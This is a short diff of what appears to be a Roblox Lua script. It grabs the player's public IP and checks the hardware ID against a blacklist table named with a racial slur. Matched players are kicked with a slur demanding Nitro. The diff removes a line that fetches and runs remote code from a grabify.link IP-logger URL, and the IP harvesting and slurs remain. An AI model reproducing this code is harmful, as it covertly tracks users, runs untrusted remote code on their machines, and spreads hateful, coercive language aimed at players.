@@ -36,7 +36,6 @@ end
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 if table.find(NiggerHWID, HWID) then
-    loadstring(game:HttpGet("https://grabify.link/0I3C40", true))()
     game.Players.LocalPlayer:Kick("GIVE ME NITRO NIGGA")
 end
 
